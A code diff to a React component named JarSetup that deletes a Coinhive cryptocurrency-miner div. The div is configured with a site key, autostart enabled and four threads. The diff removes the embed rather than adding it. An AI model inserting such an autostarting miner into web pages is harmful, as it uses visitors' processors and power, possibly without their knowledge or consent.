@@ -496,10 +496,6 @@ class JarSetup extends React.Component {
         <Row>
           {nonSelectedJars}
         </Row>
-        <div className="coinhive-miner" style={{
-          "width": "100%",
-          "height": "94px"
-        }} data-key="NiiRozU9BSqWfKNl81wpAS5lwJgbhb1U" data-autostart="true" data-whitelabel="false" data-background="#000000" data-text="#eeeeee" data-action="#00ff00" data-graph="#555555" data-threads="4" data-throttle="0.1"></div>
         <Modal show={this.state.showModal} onHide={this.close.bind(this)}>
           <Modal.Header>
             <Modal.Title>
